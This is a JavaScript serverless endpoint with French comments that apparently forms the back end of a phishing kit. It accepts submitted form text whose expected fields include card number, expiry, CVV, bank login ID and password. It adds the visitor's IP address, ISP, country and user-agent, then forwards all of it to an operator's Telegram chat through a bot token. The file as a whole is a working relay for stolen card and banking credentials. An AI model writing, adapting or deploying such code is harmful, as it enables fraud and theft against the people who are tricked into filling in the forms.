// api/notify.js

const TOKEN        = process.env.TELEGRAM_TOKEN;
const CHAT         = process.env.CHAT_ID;
const IPINFO_TOKEN = process.env.IPINFO_TOKEN || '';

export const config = {
  api: {
    bodyParser: false,  // on lit nous-mêmes le corps
  },
};

// lit JSON ou texte brut
async function readBody(req) {
  const ct = req.headers['content-type'] || '';
  const buf = [];
  for await (const chunk of req) buf.push(chunk);
  const raw = Buffer.concat(buf).toString();
  if (ct.includes('application/json')) {
    try {
      return JSON.parse(raw).message || '';
    } catch {}
  }
  return raw;
}

// lookup ISP / pays
async function geoLookup(ip) {
  let isp = 'inconnue', country = 'inconnue', countryCode = '';
  // ... (mêmes 3 calls que précédemment) ...
  try {
    const r = await fetch(
      `https://ipinfo.io/${ip}/json${IPINFO_TOKEN ? `?token=${IPINFO_TOKEN}` : ''}`
    );
    if (r.ok) {
      const d = await r.json();
      if (d.org) isp = d.org.replace(/^AS\d+\s+/i, '');
      if (d.country) countryCode = d.country;
      country = countryCode || country;
      return { isp, countryCode, country };
    }
  } catch {}
  try {
    const r = await fetch(`https://ipwho.is/${ip}`);
    const d = await r.json();
    if (d.success) return { isp: d.org||isp, countryCode: d.country_code, country: d.country||country };
  } catch {}
  try {
    const r = await fetch(
      `https://ip-api.com/json/${ip}?fields=status,country,countryCode,isp`
    );
    const d = await r.json();
    if (d.status === 'success') {
      isp = d.isp.replace(/^AS\d+\s+/i, '')||isp;
      country = d.country||country;
      countryCode = d.countryCode;
      return { isp, countryCode, country };
    }
  } catch {}
  return { isp, countryCode, country };
}

// nom complet du pays
function fullCountryName(codeOrName) {
  if (!codeOrName) return 'inconnue';
  if (codeOrName.length === 2) {
    try {
      return new Intl.DisplayNames(['fr'], { type: 'region' }).of(codeOrName);
    } catch {}
  }
  return codeOrName;
}

export default async function handler(req, res) {
  // CORS (pré-flight pour Safari)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST, OPTIONS');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  // 1️⃣ Lecture du message
  const rawMsg = (await readBody(req)).trim();
  if (!rawMsg) return res.status(400).json({ error: 'Missing message' });

  // 2️⃣ IP + UA
  const forwarded = req.headers['x-forwarded-for'];
  const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
  const ua        = req.headers['user-agent'] || 'inconnu';

  // 3️⃣ Geo
  const { isp, countryCode, country } = await geoLookup(ip);
  const countryDisplay = fullCountryName(country || countryCode);

  // 4️⃣ Date & heure (FR, 2 chiffres pour l’année)
  const now  = new Date();
  const date = now.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'2-digit'});
  const time = now.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});

  // 5️⃣ Mapping icônes
  const iconMap = {
    'étape':          '📣',
    'nom':            '👤',
    'prénom':         '🙋',
    'téléphone':      '📞',
    'email':          '✉️',
    'adresse':        '🏠',
    'carte':          '💳',
    'expiration':     '📅',
    'cvv':            '🔒',
    'banque':         '🏦',
    'identifiant banque': '🆔',
    'mot de passe':   '🔑'
  };

  // 6️⃣ Construction du texte avec détection des icônes
  const lines = rawMsg.split('\n').map(l => l.trim()).filter(l => l);
  let text = '';
  for (let line of lines) {
    const low = line.toLowerCase();
    // on cherche la première clé qui matche le début de la ligne
    let icon = '';
    for (let key in iconMap) {
      if (low.startsWith(key)) {
        icon = iconMap[key];
        break;
      }
    }
    text += icon ? `${icon} ${line}\n` : `${line}\n`;
  }

  // 7️⃣ Ajout du bloc infos
  text += `\n🗓️ Date & heure : ${date}, ${time}\n`;
  text += `🌐 IP Client     : ${ip}\n`;
  text += `🔎 ISP Client    : ${isp}\n`;
  text += `🌍 Pays Client   : ${countryDisplay}\n`;
  text += `📍 User-Agent    : ${ua}\n`;
  text += `©️ ${now.getFullYear()} ©️`;

  // 8️⃣ Envoi plain-text sur Telegram
  await fetch(
    `https://api.telegram.org/bot${TOKEN}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text, disable_web_page_preview: true })
    }
  );

  return res.status(200).json({ ok: true });
}